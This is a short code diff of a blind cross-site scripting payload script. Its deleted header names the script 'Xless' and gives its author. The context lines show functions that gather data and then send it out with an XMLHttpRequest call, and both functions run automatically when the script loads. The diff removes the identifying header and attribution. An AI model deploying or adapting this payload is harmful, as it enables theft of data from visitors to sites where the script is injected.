@@ -1,6 +1,3 @@
-// Xless: The serverlesss Blind XSS app.
-// Author: Mazin Ahmed <mazin@mazinahmed.net>
-
 console.log("Loaded xless.");
 
 var collected_data = {};
@@ -35,7 +32,6 @@ function exfiltrate_loot() {
   xhr.setRequestHeader("Content-Type", "application/json")
   xhr.send(JSON.stringify(collected_data));
 }
-
 
 collect_data()
 exfiltrate_loot()
